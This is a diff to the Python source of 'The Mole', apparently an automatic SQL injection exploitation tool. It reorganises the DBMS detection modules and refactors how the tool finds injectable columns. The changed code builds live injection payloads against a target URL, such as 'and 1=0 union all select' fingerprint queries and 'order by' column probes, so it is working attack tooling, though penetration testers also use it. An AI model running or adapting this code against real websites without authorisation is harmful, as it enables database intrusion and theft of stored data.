@@ -23,7 +23,10 @@
 # Gastón Traberg
 
 from domanalyser import DomAnalyser,NeedleNotFound
-from dbmsmoles import DbmsMole, MysqlMole, PostgresMole, MssqlMole
+from dbmsmoles import DbmsMole
+from mysql import MysqlMole
+from postgres import PostgresMole
+from mssql import MssqlMole
 from dbdump import DatabaseDump
 from threader import Threader
 from output import BlindSQLIOutput
@@ -67,6 +70,7 @@ class TheMole:
         self.separator = ''
         self.comment = ''
         self.parenthesis = 0
+        self._dbms_mole = None
         self.database_dump = DatabaseDump()
         
         original_request = self.get_requester().request(self.url.replace(self.wildcard, self.prefix))
@@ -81,7 +85,19 @@ class TheMole:
         except SQLInjectionNotDetected:
             print('[-] Could not detect SQL Injection.')
             return
+
+        if not self.separator == ' ':
+            self.end = 'and {par}{sep}{sep}like{sep}'.format(sep=self.separator, par=(self.parenthesis * ')'))
+        else:
+            self.end = ' '
+
         if self.mode == 'union':
+            try:
+                self._detect_dbms_blind()
+            except:
+                pass
+            
+            self.end = ''
             req = self.get_requester().request(
                 self.generate_url(' own3d by 1')
             )
@@ -101,12 +117,9 @@ class TheMole:
                 print('[-] Could not exploit SQL Injection.')
                 return
             
-            self._detect_dbms()
+            if self._dbms_mole is None:
+                self._detect_dbms()
         else:
-            if not self.separator == ' ':
-                self.end = 'and {par}{sep}{sep}like{sep}'.format(sep=self.separator, par=(self.parenthesis * ')'))
-            else:
-                self.end = ' '
             self._detect_dbms_blind()
         
         self.initialized = True
@@ -473,29 +486,35 @@ class TheMole:
         self.query_columns = pri
         print("\r[+] Found number of columns:", self.query_columns)
     
-    def _find_injectable_field(self):
-        used_hashes = set()
+    def _find_injectable_field_using(self, dbms_mole):
         base = 714
-        for mole in TheMole.dbms_mole_list:
-            fingers = mole.injectable_field_fingers(self.query_columns, base)
-            for i in fingers:
-                hashes, to_search_hashes = i
-                hash_string = ",".join(hashes)
-                if not hash_string in used_hashes:
-                    req = self.analyser.decode(self.get_requester().request(
-                            self.generate_url(
-                                " and 1=0 union all select " + hash_string
-                            )
-                          ))
-                    try:
-                        self.injectable_fields = list(map(lambda x: int(x) - base, [hash for hash in to_search_hashes if hash in req]))
-                        if len(self.injectable_fields) > 0:
-                            print("[+] Injectable fields found: [" + ', '.join(map(lambda x: str(x + 1), self.injectable_fields)) + "]")
-                            if self._filter_injectable_fields(mole):
-                                return
-                    except Exception as ex:
-                        print(ex)
-                        used_hashes.add(hash_string)                
+        fingers = dbms_mole.injectable_field_fingers(self.query_columns, base)
+        for i in fingers:
+            hashes, to_search_hashes = i
+            hash_string = ",".join(hashes)
+            req = self.analyser.decode(self.get_requester().request(
+                    self.generate_url(
+                        " and 1=0 union all select " + hash_string
+                    )
+                  ))
+            try:
+                self.injectable_fields = list(map(lambda x: int(x) - base, [hash for hash in to_search_hashes if hash in req]))
+                if len(self.injectable_fields) > 0:
+                    print("[+] Injectable fields found: [" + ', '.join(map(lambda x: str(x + 1), self.injectable_fields)) + "]")
+                    if self._filter_injectable_fields(dbms_mole):
+                        return True
+            except Exception as ex:
+                print(ex)
+        return False
+
+    def _find_injectable_field(self):
+        if self._dbms_mole is None:
+            for mole in TheMole.dbms_mole_list:
+                if self._find_injectable_field_using(mole):
+                    return
+        else:
+            if self._find_injectable_field_using(self._dbms_mole):
+                return
         raise SQLInjectionNotExploitable()
 
     def _filter_injectable_fields(self, dbms_mole_class):
